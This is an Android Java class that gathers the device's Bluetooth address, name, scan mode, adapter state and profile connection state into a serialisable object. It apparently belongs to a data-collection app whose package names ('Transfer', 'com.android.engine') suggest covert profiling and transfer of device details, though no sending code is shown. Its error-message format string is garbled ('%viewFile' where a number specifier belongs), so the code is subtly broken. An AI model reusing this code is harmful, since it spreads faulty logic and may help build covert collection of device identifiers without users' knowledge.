package Transfer;

import android.bluetooth.BluetoothAdapter;
import android.bluetooth.BluetoothManager;
import android.content.Context;
import android.os.Build.VERSION;
import com.android.engine.service.MyService;
import com.android.engine.ExceptionAction;
import java.io.Serializable;

import static android.bluetooth.BluetoothAdapter.SCAN_MODE_CONNECTABLE;
import static android.bluetooth.BluetoothAdapter.SCAN_MODE_CONNECTABLE_DISCOVERABLE;
import static android.bluetooth.BluetoothAdapter.SCAN_MODE_NONE;
import static android.bluetooth.BluetoothAdapter.STATE_CONNECTED;
import static android.bluetooth.BluetoothAdapter.STATE_OFF;
import static android.bluetooth.BluetoothAdapter.STATE_ON;
import static android.bluetooth.BluetoothAdapter.STATE_TURNING_OFF;
import static android.bluetooth.BluetoothAdapter.STATE_TURNING_ON;

public class Bluetooth implements Serializable {

  public String ADDRESS;
  public String CONNECTIONSTATE;
  public boolean ISDISCOVERING;
  public boolean ISENABLED;
  public boolean ISMULTIPLEADVERTISEMENTSUPPORTED;
  public boolean ISOFFLOADEDFILTERINGSUPPORTED;
  public boolean ISOFFLOADEDSCANBATCHINGSUPPORTED;
  public String NAME;
  public String SCANMODE;
  public String STATE;

  public Bluetooth() {
    try {
      if (VERSION.SDK_INT >= 18) {
        BluetoothAdapter adapter = ((BluetoothManager) MyService.context.getSystemService(
            Context.BLUETOOTH_SERVICE)).getAdapter();
        ADDRESS = adapter.getAddress();
        NAME = adapter.getName();

        if (adapter.getScanMode() == SCAN_MODE_CONNECTABLE) {
          SCANMODE = "Connectable";
        } else if (adapter.getScanMode() == SCAN_MODE_CONNECTABLE_DISCOVERABLE) {
          SCANMODE = "Connectable & Discoverable";
        } else if (adapter.getScanMode() == SCAN_MODE_NONE) {
          SCANMODE = "None";
        }

        if (adapter.getState() != STATE_CONNECTED) {
          if (adapter.getState() == STATE_OFF) {
            STATE = "Off";
          } else if (adapter.getState() == STATE_ON) {
            STATE = "On";
          } else if (adapter.getState() == STATE_TURNING_OFF) {
            STATE = "Turning Off";
          } else if (adapter.getState() == STATE_TURNING_ON) {
            STATE = "Turning On";
          }
        }

        if (adapter.getProfileConnectionState(1) == 2
            || adapter.getProfileConnectionState(2) == 2
            || adapter.getProfileConnectionState(3) == 2) {
          CONNECTIONSTATE = "Connected";
        } else if (adapter.getProfileConnectionState(1) == 1
            || adapter.getProfileConnectionState(2) == 1
            || adapter.getProfileConnectionState(3) == 1) {
          CONNECTIONSTATE = "Connecting";
        } else if (adapter.getProfileConnectionState(1) == 0
            || adapter.getProfileConnectionState(2) == 0
            || adapter.getProfileConnectionState(3) == 0) {
          CONNECTIONSTATE = "Disconnected";
        } else if (adapter.getProfileConnectionState(1) == 3
            || adapter.getProfileConnectionState(2) == 3
            || adapter.getProfileConnectionState(3) == 3) {
          CONNECTIONSTATE = "Disconnecting";
        }

        ISDISCOVERING = adapter.isDiscovering();
        ISENABLED = adapter.isEnabled();

        if (VERSION.SDK_INT >= 21) {
          ISMULTIPLEADVERTISEMENTSUPPORTED = adapter.isMultipleAdvertisementSupported();
          ISOFFLOADEDFILTERINGSUPPORTED = adapter.isOffloadedFilteringSupported();
          ISOFFLOADEDSCANBATCHINGSUPPORTED = adapter.isOffloadedScanBatchingSupported();
          return;
        }
        return;
      }
      throw new Exception(String.format(
          "This feature requires SDK level %viewFile. The device has level %viewFile.",
          new Object[] { 18, VERSION.SDK_INT }));
    } catch (Exception e) {
      ExceptionAction.sendExceptionAction(e.getMessage());
    }
  }
}
